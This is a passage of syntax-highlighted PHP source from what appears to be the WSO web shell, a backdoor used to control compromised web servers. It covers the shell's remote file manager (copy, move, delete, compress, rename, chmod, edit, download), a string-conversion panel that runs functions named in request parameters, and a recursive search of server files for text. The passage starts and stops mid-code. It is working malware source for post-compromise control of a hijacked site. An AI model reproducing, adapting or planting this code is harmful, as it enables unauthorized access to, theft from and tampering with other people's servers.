class="s1">&#39;\&#39;,\&#39;chmod\&#39;)&quot;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;perms&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;\&#39;, \&#39;rename\&#39;)&quot;&gt;R&lt;/a&gt; &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;\&#39;, \&#39;touch\&#39;)&quot;&gt;T&lt;/a&gt;&#39;</span> <span class="o">.</span> <span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;file&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39; &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;\&#39;, \&#39;edit\&#39;)&quot;&gt;E&lt;/a&gt; &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;\&#39;, \&#39;download\&#39;)&quot;&gt;D&lt;/a&gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&lt;/tr&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 556</span>                                                     <span class="nv">$l</span> <span class="o">=</span> <span class="nv">$l</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
<span class="lineno"> 557</span>                                                 <span class="p">}</span>
<span class="lineno"> 558</span>                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td colspan=7&gt;</span>
<span class="lineno"> 559</span> <span class="s2">  &lt;input type=hidden name=a value=&#39;FilesMan&#39;&gt;</span>
<span class="lineno"> 560</span> <span class="s2">  &lt;input type=hidden name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;</span>
<span class="lineno"> 561</span> <span class="s2">  &lt;input type=hidden name=charset value=&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;</span>
<span class="lineno"> 562</span> <span class="s2">  &lt;select name=&#39;p1&#39;&gt;&lt;option value=&#39;copy&#39;&gt;Copy&lt;/option&gt;&lt;option value=&#39;move&#39;&gt;Move&lt;/option&gt;&lt;option value=&#39;delete&#39;&gt;Delete&lt;/option&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 563</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="nb">class_exists</span><span class="p">(</span><span class="s1">&#39;ZipArchive&#39;</span><span class="p">))</span> <span class="k">echo</span> <span class="s2">&quot;&lt;option value=&#39;zip&#39;&gt;Compress (zip)&lt;/option&gt;&lt;option value=&#39;unzip&#39;&gt;Uncompress (zip)&lt;/option&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 564</span>                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;option value=&#39;tar&#39;&gt;Compress (tar.gz)&lt;/option&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 565</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nb">count</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]))</span> <span class="k">echo</span> <span class="s2">&quot;&lt;option value=&#39;paste&#39;&gt;Paste / Compress&lt;/option&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 566</span>                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;/select&gt;&amp;nbsp;&quot;</span><span class="p">;</span>
<span class="lineno"> 567</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nb">count</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;zip&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;tar&#39;</span><span class="p">)))</span> <span class="k">echo</span> <span class="s2">&quot;file name: &lt;input type=text name=p2 value=&#39;wso_&quot;</span> <span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Ymd_His&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;.&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;zip&#39;</span> <span class="o">?</span> <span class="s1">&#39;zip&#39;</span> <span class="o">:</span> <span class="s1">&#39;tar.gz&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&amp;nbsp;&quot;</span><span class="p">;</span>
<span class="lineno"> 568</span>                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;input type=&#39;submit&#39; value=&#39;&gt;&gt;&#39;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/div&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 569</span>                                                 <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno"> 570</span>                                             <span class="p">}</span>
<span class="lineno"> 571</span>                                             <span class="k">function</span> <span class="nf">actionStringTools</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 572</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2bin&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 573</span>                                                     <span class="k">function</span> <span class="nf">hex2bin</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 574</span>                                                         <span class="k">return</span> <span class="nb">decbin</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">));</span>
<span class="lineno"> 575</span>                                                     <span class="p">}</span>
<span class="lineno"> 576</span>                                                 <span class="p">}</span>
<span class="lineno"> 577</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;binhex&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 578</span>                                                     <span class="k">function</span> <span class="nf">binhex</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 579</span>                                                         <span class="k">return</span> <span class="nb">dechex</span><span class="p">(</span><span class="nb">bindec</span><span class="p">(</span><span class="nv">$p</span><span class="p">));</span>
<span class="lineno"> 580</span>                                                     <span class="p">}</span>
<span class="lineno"> 581</span>                                                 <span class="p">}</span>
<span class="lineno"> 582</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2ascii&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 583</span>                                                     <span class="k">function</span> <span class="nf">hex2ascii</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 584</span>                                                         <span class="nv">$r</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="lineno"> 585</span>                                                         <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strLen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="nv">$i</span><span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 586</span>                                                             <span class="nv">$r</span><span class="o">.=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]));</span>
<span class="lineno"> 587</span>                                                         <span class="p">}</span>
<span class="lineno"> 588</span>                                                         <span class="k">return</span> <span class="nv">$r</span><span class="p">;</span>
<span class="lineno"> 589</span>                                                     <span class="p">}</span>
<span class="lineno"> 590</span>                                                 <span class="p">}</span>
<span class="lineno"> 591</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;ascii2hex&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 592</span>                                                     <span class="k">function</span> <span class="nf">ascii2hex</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 593</span>                                                         <span class="nv">$r</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="lineno"> 594</span>                                                         <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span> <span class="nv">$r</span><span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%02X&#39;</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
<span class="lineno"> 595</span>                                                         <span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span>
<span class="lineno"> 596</span>                                                     <span class="p">}</span>
<span class="lineno"> 597</span>                                                 <span class="p">}</span>
<span class="lineno"> 598</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;full_urlencode&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 599</span>                                                     <span class="k">function</span> <span class="nf">full_urlencode</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 600</span>                                                         <span class="nv">$r</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="lineno"> 601</span>                                                         <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span> <span class="nv">$r</span><span class="o">.=</span> <span class="s1">&#39;%&#39;</span> <span class="o">.</span> <span class="nb">dechex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
<span class="lineno"> 602</span>                                                         <span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span>
<span class="lineno"> 603</span>                                                     <span class="p">}</span>
<span class="lineno"> 604</span>                                                 <span class="p">}</span>
<span class="lineno"> 605</span>                                                 <span class="nv">$stringTools</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Base64 encode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;base64_encode&#39;</span><span class="p">,</span> <span class="s1">&#39;Base64 decode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;base64_decode&#39;</span><span class="p">,</span> <span class="s1">&#39;Url encode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;urlencode&#39;</span><span class="p">,</span> <span class="s1">&#39;Url decode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;urldecode&#39;</span><span class="p">,</span> <span class="s1">&#39;Full urlencode&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;full_urlencode&#39;</span><span class="p">,</span> <span class="s1">&#39;md5 hash&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;md5&#39;</span><span class="p">,</span> <span class="s1">&#39;sha1 hash&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;sha1&#39;</span><span class="p">,</span> <span class="s1">&#39;crypt&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;crypt&#39;</span><span class="p">,</span> <span class="s1">&#39;CRC32&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;crc32&#39;</span><span class="p">,</span> <span class="s1">&#39;ASCII to HEX&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;ascii2hex&#39;</span><span class="p">,</span> <span class="s1">&#39;HEX to ASCII&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;hex2ascii&#39;</span><span class="p">,</span> <span class="s1">&#39;HEX to DEC&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;hexdec&#39;</span><span class="p">,</span> <span class="s1">&#39;HEX to BIN&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;hex2bin&#39;</span><span class="p">,</span> <span class="s1">&#39;DEC to HEX&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;dechex&#39;</span><span class="p">,</span> <span class="s1">&#39;DEC to BIN&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;decbin&#39;</span><span class="p">,</span> <span class="s1">&#39;BIN to HEX&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;binhex&#39;</span><span class="p">,</span> <span class="s1">&#39;BIN to DEC&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;bindec&#39;</span><span class="p">,</span> <span class="s1">&#39;String to lower case&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;strtolower&#39;</span><span class="p">,</span> <span class="s1">&#39;String to upper case&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;strtoupper&#39;</span><span class="p">,</span> <span class="s1">&#39;Htmlspecialchars&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;htmlspecialchars&#39;</span><span class="p">,</span> <span class="s1">&#39;String length&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;strlen&#39;</span><span class="p">,);</span>
<span class="lineno"> 606</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 607</span>                                                     <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno"> 608</span>                                                     <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 609</span>                                                     <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$stringTools</span><span class="p">))</span> <span class="k">echo</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno"> 610</span>                                                     <span class="nv">$temp</span> <span class="o">=</span> <span class="s2">&quot;document.getElementById(&#39;strOutput&#39;).style.display=&#39;&#39;;document.getElementById(&#39;strOutput&#39;).innerHTML=&#39;&quot;</span> <span class="o">.</span> <span class="nb">addcslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">()),</span> <span class="s2">&quot;</span>
<span class="lineno"> 611</span> 
<span class="lineno"> 612</span> <span class="s2">  \&#39;&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span>
<span class="lineno"> 613</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 614</span>                                                     <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span>
<span class="lineno"> 615</span> <span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span>
<span class="lineno"> 616</span>                                                     <span class="k">exit</span><span class="p">;</span>
<span class="lineno"> 617</span>                                                 <span class="p">}</span>
<span class="lineno"> 618</span>                                                 <span class="nx">wsoHeader</span><span class="p">();</span>
<span class="lineno"> 619</span>                                                 <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;String conversions&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 620</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 621</span>                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;form name=&#39;toolsForm&#39; onSubmit=&#39;if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;&#39;&gt;&lt;select name=&#39;selectTool&#39;&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 622</span>                                                 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$stringTools</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot;&lt;option value=&#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$k</span> <span class="o">.</span> <span class="s2">&quot;&lt;/option&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 623</span>                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;/select&gt;&lt;input type=&#39;submit&#39; value=&#39;&gt;&gt;&#39;/&gt; &lt;input type=checkbox name=ajax value=1 &quot;</span> <span class="o">.</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="s1">&#39;checked&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&gt; send using AJAX&lt;br&gt;&lt;textarea name=&#39;input&#39; style=&#39;margin-top:5px&#39; class=bigarea&gt;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;&#39;</span> <span class="o">:</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span> <span class="o">.</span> <span class="s2">&quot;&lt;/textarea&gt;&lt;/form&gt;&lt;pre class=&#39;ml1&#39; style=&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;display:none;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;margin-top:5px&#39; id=&#39;strOutput&#39;&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 624</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 625</span>                                                     <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$stringTools</span><span class="p">))</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]));</span>
<span class="lineno"> 626</span>                                                 <span class="p">}</span>
<span class="lineno"> 627</span>                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&lt;/div&gt;&lt;br&gt;&lt;h1&gt;Search text in files:&lt;/h1&gt;&lt;div class=content&gt;</span>
<span class="lineno"> 628</span> <span class="s2">      &lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;table cellpadding=&#39;1&#39; cellspacing=&#39;0&#39; width=&#39;50%&#39;&gt;</span>
<span class="lineno"> 629</span> <span class="s2">          &lt;tr&gt;&lt;td width=&#39;1%&#39;&gt;Text:&lt;/td&gt;&lt;td&gt;&lt;input type=&#39;text&#39; name=&#39;text&#39; style=&#39;width:100%&#39;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 630</span> <span class="s2">          &lt;tr&gt;&lt;td&gt;Path:&lt;/td&gt;&lt;td&gt;&lt;input type=&#39;text&#39; name=&#39;cwd&#39; value=&#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39; style=&#39;width:100%&#39;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 631</span> <span class="s2">          &lt;tr&gt;&lt;td&gt;Name:&lt;/td&gt;&lt;td&gt;&lt;input type=&#39;text&#39; name=&#39;filename&#39; value=&#39;*&#39; style=&#39;width:100%&#39;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 632</span> <span class="s2">          &lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&#39;submit&#39; value=&#39;&gt;&gt;&#39;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 633</span> <span class="s2">          &lt;/table&gt;&lt;/form&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 634</span>                                                 <span class="k">function</span> <span class="nf">wsoRecursiveGlob</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 635</span>                                                     <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="nv">$path</span><span class="o">.=</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
<span class="lineno"> 636</span>                                                     <span class="nv">$paths</span> <span class="o">=</span> <span class="o">@</span><span class="nb">array_unique</span><span class="p">(</span><span class="o">@</span><span class="nb">array_merge</span><span class="p">(</span><span class="o">@</span><span class="nb">glob</span><span class="p">(</span><span class="nv">$path</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]),</span> <span class="o">@</span><span class="nb">glob</span><span class="p">(</span><span class="nv">$path</span> <span class="o">.</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="nx">GLOB_ONLYDIR</span><span class="p">)));</span>
<span class="lineno"> 637</span>                                                     <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$paths</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nb">count</span><span class="p">(</span><span class="nv">$paths</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 638</span>                                                         <span class="k">foreach</span> <span class="p">(</span><span class="nv">$paths</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 639</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 640</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="nv">$path</span> <span class="o">!=</span> <span class="nv">$item</span><span class="p">)</span> <span class="nx">wsoRecursiveGlob</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno"> 641</span>                                                             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 642</span>                                                                 <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$item</span><span class="p">),</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">view</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 643</span>                                                             <span class="p">}</span>
<span class="lineno"> 644</span>                                                         <span class="p">}</span>
<span class="lineno"> 645</span>                                                     <span class="p">}</span>
<span class="lineno"> 646</span>                                                 <span class="p">}</span>
<span class="lineno"> 647</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="nx">wsoRecursiveGlob</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
<span class="lineno"> 648</span>                                                 <span class="k">echo</span> <span class="s2">&quot;&lt;/div&gt;&lt;br&gt;&lt;h1&gt;Search for hash:&lt;/h1&gt;&lt;div class=content&gt;</span>
<span class="lineno"> 649</span> <span class="s2">      &lt;form method=&#39;post&#39; target=&#39;_blank&#39; name=&#39;hf&#39;&gt;</span>
